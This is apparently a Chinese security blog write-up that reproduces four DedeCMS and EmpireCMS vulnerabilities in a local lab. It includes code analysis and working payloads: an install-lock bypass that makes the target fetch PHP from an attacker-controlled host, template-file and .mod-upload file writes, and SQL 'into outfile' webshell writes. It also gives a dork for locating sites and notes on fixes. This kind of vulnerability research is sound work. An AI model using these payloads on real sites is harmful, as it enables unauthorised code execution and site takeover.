---
title: 织梦cms、帝国cms的搭建及漏洞复现
id: 织梦cms、帝国cms的搭建及漏洞复现
---

<!-- more -->

## 前言

这里看到phpstudy自带了这织梦cms和帝国cms，可能是比较经典的cms吧

因此打算安装这两样复现一下漏洞



## 正文

### 安装

首先在官网下载源码~

织梦cms：[产 品 / DedeCMS / 软件下载_织梦CMS](http://www.dedecms.com/products/dedecms/downloads/)

帝国cms：[帝国软件 -> 产品下载 (phome.net)](http://www.phome.net/download/)

我下载的是这两个：

![7FYRZI___K__YW_X_BR0YIS.png](https://i.loli.net/2021/02/13/1SHLytuQWisp8PO.png)

具体安装过程很简单，跟着教程走就可以了

进入安装目录，逐步填写信息即可

> 安装目录：
>
> 织梦cms：uploads/install
>
> 帝国cms：upload/e/install
>
> ps:在真实配置的时候是将upload中的源文件复制到服务器目录中。这里我直接解压了~



## 漏洞复现

### 织梦cms

dedecms的漏洞很多，比较用的人多了，找洞的人也就多了。

这里先随便挑两个复现一下

ps：google hack搜索dedecms搭建的网站：`intitle:powered by dedecms`

![google_hack常用语法](https://i.loli.net/2021/02/14/5scAk7leiI3Qx1j.jpg)



#### 5.7-SP1远程文件包含漏洞(CVE-2015-4553)

> 影响版本：DeDeCMS < 5.7-sp1,包括5.7 sp1版本
>
> 描述：该漏洞存在于/install/index.php中(安装后为index.php.bak)。由于$$符号的使用不当（即可变变量）导致变量覆盖，最终引发远程文件包含漏洞
>
> 修复：将相关变量改为常量定义

织梦cms5.7 sp1：[织梦CMS(DedeCMS) v5.7 SP1 UTF8 build20150618 - 源码下载 (downcode.com)](http://www.downcode.com/downcode/j_12898.shtml)



```php
foreach(Array('_GET','_POST','_COOKIE') as $_request)
    #用foreach遍历数组，每次循环将数组单元的值赋给$_request（以get、post、cookie传入的值）
{
    foreach($$_request as $_k => $_v) ${$_k} = RunMagicQuotes($_v);
    #foreach遍历数组，将当前数组单元的键名赋给$_k，当前数组单元的值赋给$_v。
    #RunMagicQuotes()作为过滤函数存在
    #$$_request：可变变量，以$_request这个变量的值作为变量名
    #${$_k}：PHP分析双引号中的数据是否含有变量（并解析它的值），当用双引号时,{}用来界定变量的界限。
}
```

```php
function _RunMagicQuotes（&$svar）{
if（！get_magic_quotes_gpc（））{
    
	if（is_array（$svar））{
	foreach（$svar as $_k => $_v）$svar[$_k] = _RunMagicQuotes（$_v）；
        
	}else{
        
	if（strlen（$svar）>0&&preg_match（'#^（cfg_|GLOBALS|_GET|_POST|_COOKIE）#'，$svar））{
		exit（'Request var not allow！'）；
    		}
        
	$svar = addslashes（$svar）；
        #使用addslashes（）函数过滤
        #在某些字符前加上了反斜线。: 引号（'）、双引号（"）、反斜线（\）、 NULL（null 字符）
		}
	}
return $svar；
}
```

访问安装页面，由于install_lock的存在，无法重新安装：

![](https://i.loli.net/2021/02/14/Fm1CsbuBn6LYoZW.png)

判断原理：定义了变量$insLockfile，利用file_exists()判断install_lock.txt是否存在
（取不存在的文件即可使判断条件失效）

![](https://i.loli.net/2021/02/14/4J1kzME8CPFAxqH.png)

由此进行变量覆盖即可绕过上述判断 `xxx/uploads/install/index.php?insLockfile=1`

![](https://i.loli.net/2021/02/14/qQlDNRW7B2nJY6k.png)

后续由于install_lock.txt的存在，使得安装无法连贯，但访问相应的页面还是可以的

如：`xxx/uploads/install/index.php?step=3&insLockfile=1`（由此我们可以在后面访问step=11）

![](https://i.loli.net/2021/02/14/gG5cka9ZzYQHDRd.png)



再看源码

```php
else if($step==11)
{
	require_once('../data/admin/config_update.php');
    #包含了../data/admin/config_update.php,在其中定义了updateHost和linkHost
    
	$rmurl = $updateHost."dedecms/demodata.{$s_lang}.txt";
	#将config_update.php中的UPDATEHOST与dedecms/demodata.{$s_lang}.txt拼接为字符串
    
	$sql_content = file_get_contents($rmurl);
    #利用file_get_contents()读取$rmurl指代的文件内容
    
	$fp = fopen($install_demo_name,'w');#定义变量$fp,打开$install_demo_name指代的文件(w权限)
	if(fwrite($fp,$sql_content))#将$sql_content写入到$install_demo_name指代的文件
		echo '&nbsp; <font color="green">[√]</font> 存在(您可以选择安装进行体验)';
	else
		echo '&nbsp; <font color="red">[×]</font> 远程获取失败';
	unset($sql_content);
	fclose($fp);
	exit();
}
```

包含的config_update，其中定义了变量updateHost和linkHost

![](https://i.loli.net/2021/02/14/Vj3Z1m9YvATG6fu.png)

利用：

1.判断语句为if(step==11），须传入step=11；
存在install_lock.txt，传入insLockfile=1（取不存在的文件使得判断条件失效）

```
payload：
xxx/uploads/install/index.php?step=11&insLockfile=1
```

![](https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png)



2.updateHost是来自于config_update.php的包含，无法直接将该变量覆盖。
故需要借用`fopen($install_demo_name,'w')`**将config_update.php清空**
(w权限特质, 文件存在则清空内容再写入)



构造payload：

传入`$install_demo_name=config_update.php；`

而`fwrite($fp,$sql_content)`的存在会将 `$sql_content` 写入`config_update.php`

`$sql_content`是提取`$rmurl`指代的文件内容写入

`file_get_contents`读取失败时返回NULL，因此控制`$s_lang`为不存在的文件名即可使`$sql_content`= NULL

```
payload：
xxx/uploads/install/index.php?step=11&insLockfile=1&install_demo_name=../data/admin/config_update.php&s_lang=hhhhhh
```

显示为0kb，显然config_update.php已被清空了

![](https://i.loli.net/2021/02/14/PUsAi5xjzIXw1c7.png)



3.随着config_update.php的清空，参数updateHost变得可控，可以开始远程上传文件了~



在kali上创建一个dedecms文件夹,然后创建一个demodata.gb2312.txt,写入`<?php phpinfo();?>` 

然后开启web服务: `sudo service apache2 start`

![](https://i.loli.net/2021/02/14/P7RzZ83vpw1kISt.png)

```
payload：
xxx/uploads/install/index.php?step=11&insLockfile=1&install_demo_name=../info.php&updateHost=目标主机ip
```

显示如下画面即成功

![](https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png)

如下

![](https://i.loli.net/2021/02/14/DEIowJPlQvh3dyG.png)



此漏洞根源还是变量覆盖，修复：

1、可以看看DISCUZ是怎么做的，当发现KEY的第一个字符存在_就不注册变量。

```php
foreach(array(‘_COOKIE’, ‘_POST’, ‘_GET’) as $_request) {

 foreach($$_request as $_key => $_value) {

 $_key{0} != ‘_’ && $$_key = daddslashes($_value);

 }

}
```

2、官方sp2：

利用define函数构造为常量

#### 5.7-SP2后台代码执行漏洞(CNVD-2018-01221)

> 影响版本：DeDeCMS < 5.7-sp2,包括5.7 sp2版本
>
> 描述：tpl.php中存在代码执行漏洞,可以通过该漏洞在增加新标签中上传木马,获取webshell。
> 利用条件：需要登录后台；后台的账户权限是管理员权限。

1、此处要求具有管理员权限，并登入后台

2、分析dede/tpl.php：

```php
...
else if($action=='savetagfile')
    #$action必须等于savetagfile才能执行下面代码
{
    csrf_check();#检验csrf，必须添加token进行绕过
    if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
        #此处正则匹配：[a-z0-9_-]任意字符(大于1次) + .lib.php 的字符串：xxx.lib.php
        #$filename不符合正则表达则无法进行修改，构造符号正则的$filename即可
    {
        ShowMsg('文件名不合法，不允许进行操作！', '-1');
        exit();
    }
    require_once(DEDEINC.'/oxwindow.class.php');
    $tagname = preg_replace("#\.lib\.php$#i", "", $filename);
    $content = stripslashes($content);
    $truefile = DEDEINC.'/taglib/'.$filename;
    #传入的路径为include/taglib/filename(常量DEDEINC=include)
    $fp = fopen($truefile, 'w');
    fwrite($fp, $content);#将$content的内容写入$fp代表的路径
    fclose($fp);
    ...
```



此处正则匹配：[a-z0-9_-]任意字符(大于1次) + .lib.php 的字符串：xxx.lib.php
![](https://i.loli.net/2021/02/14/rX9lOf3dHRJyiGD.png)

3、获取token绕过csrf

查看tpl.php，发现action有很多参数，但仅当action=upload才能获取token

![](https://i.loli.net/2021/02/14/hNAKDiyJRT9jeBL.png)

访问tpl.php?action=upload；查看页面源代码即可获取token

![](https://i.loli.net/2021/02/14/82xRVBh3gONomtQ.png)

4、

上传参数：
(由于dedecms全局变量注册的特性，content变量和filename变量可控，可以直接将content写入xxx.lib.php文件)
`action=savetagfile`
`token=上面action=upload获取的token`
`content=要写入的🐎`
`filename=xxx.lib.php（要匹配正则）`

```
payload:
dede/tpl.php?action=savetagfile&token=6ef0da020e1836c5401127d2605cb35b&filename=info.lib.php&content=<?php phpinfo();?>
```

之前查看代码可知传入的路径为include/taglib/$filename

访问`include/taglib/info.lib.php`即可

![](https://i.loli.net/2021/02/14/dIOG1YUcrPkWjHg.png)

修复：

1.禁止此处写入文件。

2.过滤恶意标签



### 帝国cms

#### 7.5后台getshell(CVE-2018-18086)

```
影响版本：帝国CMS(EmpireCMS) <= 7.5

描述：EmpireCMS7.5版本中的/e/class/moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。
```

上传任意文件：

/e/admin/ecmsmod.php中：

```php
//导入模型
elseif($enews=="LoadInMod")
{
	$file=$_FILES['file']['tmp_name'];
    $file_name=$_FILES['file']['name'];
    $file_type=$_FILES['file']['type'];
    $file_size=$_FILES['file']['size'];
	LoadInMod($_POST,$file,$file_name,$file_type,$file_size,$logininid,$loginin);
}
```


查看LoadInMod函数（/e/class/moddofun.php）：

<details>
	<summary>LoadInMod函数</summary>
	<pre><codes>
	function LoadInMod($add,$file,$file_name,$file_type,$file_size,$userid,$username){
	global $empire,$dbtbpre,$ecms_config;
	//验证权限
	CheckLevel($userid,$username,$classid,"table");
	$tbname=RepPostVar(trim($add['tbname']));
	if(!$file_name||!$file_size||!$tbname)
	{
		printerror("EmptyLoadInMod","");
	}
	//扩展名
	$filetype=GetFiletype($file_name);
	if($filetype!=".mod")
	{
		printerror("LoadInModMustmod","");
	}
	//表名是否已存在
	$num=$empire->gettotal("select count(*) as total from {$dbtbpre}enewstable where tbname='$tbname' limit 1");
	if($num)
	{
		printerror("HaveLoadInTb","");
	}
	//上传文件
	$path=ECMS_PATH."e/data/tmp/mod/uploadm".time().make_password(10).".php";
    #使用make_password(10)对时间进行加密最终拼接成为文件名
	$cp=@move_uploaded_file($file,$path);
	if(!$cp)
	{
		printerror("EmptyLoadInMod","");
	}
	DoChmodFile($path);
    @include($path);#这里将$path指代的文件包含了，由此可以构造php进行文件操作让他帮我们写shell
    UpdateTbDefMod($tid,$tbname,$mid);
    //公共变量
    TogSaveTxtF(1);
    GetConfig(1);//更新缓存
    //生成模型表单文件
    $modr=$empire->fetch1("select mtemp,qmtemp,cj from {$dbtbpre}enewsmod where mid='$mid'");
    ChangeMForm($mid,$tid,$modr[mtemp]);//更新表单
    ChangeQmForm($mid,$tid,$modr[qmtemp]);//更新前台表单
    ChangeMCj($mid,$tid,$modr[cj]);//采集表单
    //删除文件
    DelFiletext($path);
    //操作日志
    insert_dolog("tid=$tid&tb=$tbname<br>mid=$mid");
    printerror("LoadInModSuccess","db/ListTable.php".hReturnEcmsHashStrHref2(1));
    }
    </codes></pre>
</details>


关键代码分析如下（因为代码太长了==就截图出来）

![](https://i.loli.net/2021/02/14/Hu1JlL5yQcOomKk.png)

如下

`<?php fputs(fopen('info.php','w'),'<?php phpinfo(); ?>');?>`

`<?php file_put_contents(“info.php”,”<?php phpinfo(); ?>”); ?>`

上传的文件被包含（被php解析）就会执行以上代码，从而在同目录下创建 `info.php` (`<?php phpinfo(); ?>”); ?>`)



那么来复现一下：

按照如下操作进入上传页面

![](https://i.loli.net/2021/02/14/Igh9rTBwJ16nzDu.png)

![上传页面](https://i.loli.net/2021/02/14/SI7Vw1JAtyqQhKu.png)

构造一个内容为

`<?php fputs(fopen('info.php','w'),'<?php phpinfo(); ?>');?>`

或`<?php file_put_contents(“info.php”,”<?php phpinfo(); ?>”); ?>`

的.mod后缀的文件

![创建文件~](https://i.loli.net/2021/02/14/x17kit5zP9vr8sJ.png)

![导入~](https://i.loli.net/2021/02/14/bSVqfcGsriWaKpD.png)

可以看到文件成功写入了
![成功写入](https://i.loli.net/2021/02/14/bWnH2d4LjRxMgaw.png)

访问即可
![](https://i.loli.net/2021/02/14/o7HhIAsL9CYd6rZ.png)





#### 7.5 代码注入(CVE-2018-19462)

> 影响版本：帝国CMS(EmpireCMS) <= 7.5
>
> 描述：EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。

漏洞出现页面：

这里其实是使用了文件引用，引用了文件upload/e/admin/db/DoSql.php

![](https://i.loli.net/2021/02/14/DEnAXeTWalSvZR3.png)

查看DoSql.php：

```php
function ExecSql($id,$userid,$username){
	global $empire,$dbtbpre;
	$id=(int)$id;
	if(empty($id))
	{
		printerror('EmptyExecSqlid','');
	}
	$r=$empire->fetch1("select sqltext from {$dbtbpre}enewssql where id='$id'");
	if(!$r['sqltext'])
	{
		printerror('EmptyExecSqlid','');
    }
	$query=RepSqlTbpre($r['sqltext']);#sqltext是上图表格上传的内容，经RepSqlTbpre处理
	DoRunQuery($query);#对$query处理
	//操作日志
	insert_dolog("query=".$query);
	printerror("DoExecSqlSuccess","ListSql.php".hReturnEcmsHashStrHref2(1));
}
```

`$query=RepSqlTbpre($r['sqltext']);`：
sqltext就是网页中表格上传的内容，在函数ExecSql()中由RepSqlTbpre()处理

再来看一下RepSqlTbpre():

```php
function RepSqlTbpre($sql){#利用str_replace()将表的前缀进行替换
	global $dbtbpre;
	$sql=str_replace('[!db.pre!]',$dbtbpre,$sql#将表的前缀进行替换
	return $sql;
}
```

`DoRunQuery($query);`：对$query处理（去除空格）,用`;`分割然后遍历，无其他限制or过滤

```php
function DoRunQuery($sql){
	global $empire;
	$sql=str_replace("\r","\n",$sql);#将$sql中的"\r"以"\n"替换
	$ret=array();
	$num=0;
	foreach(explode(";\n",trim($sql)) as $query){#以;分割再遍历
    #explode使用一个字符串切割另一个字符串，并返回数组。这里使用";\n" 切割 trim($sql)
		$queries=explode("\n",trim($query));#trim()去除字符串首尾空白
		foreach($queries as $query)
		{
			$ret[$num].=$query[0]=='#'||$query[0].$query[1]=='--'?'':$query;
		}
		$num++;
	}
	unset($sql);
	foreach($ret as $query)
	{
		$query=trim($query);
		if($query)
		{
			$empire->query($query);
		}
	}
}
```

由此可执行恶意的sql语句



构造payload：(outfile、dumpfile)

```sql
select "<?php phpinfo(); ?>" into outfile "D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php"
```

or

```sql
select "<?php phpinfo(); ?>" into dumpfile "D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php"
```

![将语句输入其中](https://i.loli.net/2021/02/14/r3WmvflGnU9kVD7.png)


执行成功，可以看到成功写入myinfo.php
![执行成功，成功写入myinfo.php](https://i.loli.net/2021/02/14/afoZG4bF6jCXKx8.png)

访问即可触发：
![](https://i.loli.net/2021/02/14/DBmZWKXjVf6YiGx.png)



如果不行的话可能是mysql安全限制的原因

> `secure_file_priv`参数：查看具有写权限的目录
>
> - 当secure_file_priv的值为`null `，表示限制mysqld 不允许导入|导出
> - 当secure_file_priv的值`没有具体值`时（=""），表示不对mysqld 的导入|导出做限制
> - 当secure_file_priv的值为`/tmp/ `，表示限制mysqld 的导入|导出只能发生在/tmp/目录下

修改`secure_file_priv`参数为空，如下；保存重启mysql即可
![](https://i.loli.net/2021/02/14/UPoT3sOjrF6i5MK.png)

